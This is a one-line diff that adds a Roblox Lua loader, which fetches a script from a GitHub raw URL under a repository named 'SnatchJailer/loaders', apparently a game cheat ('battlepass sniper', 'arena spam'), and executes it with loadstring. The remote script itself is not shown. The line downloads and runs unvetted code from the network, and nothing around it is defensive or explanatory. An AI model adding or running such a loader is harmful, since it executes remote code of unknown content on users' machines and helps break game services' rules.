@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SnatchJailer/loaders/main/loaders/battlepass-sniper-arena-spam5-4iev4snshr0pa6.lua"))()
